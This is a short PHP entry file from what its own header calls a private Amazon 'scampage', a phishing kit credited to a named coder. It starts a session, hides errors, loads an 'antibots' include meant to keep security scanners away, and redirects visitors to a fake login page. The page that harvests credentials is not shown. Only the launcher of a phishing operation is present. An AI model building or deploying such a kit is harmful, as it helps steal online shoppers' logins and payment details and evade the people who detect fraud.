<?php
/*
      PRIV8 AM4ZON SCAMP4GE BY XFORGEX CODER

*/

// Start the session
session_start();
error_reporting(0);
# Adding antibots
include('/codead_prevent/include.php');





header("Location: Login/login.php");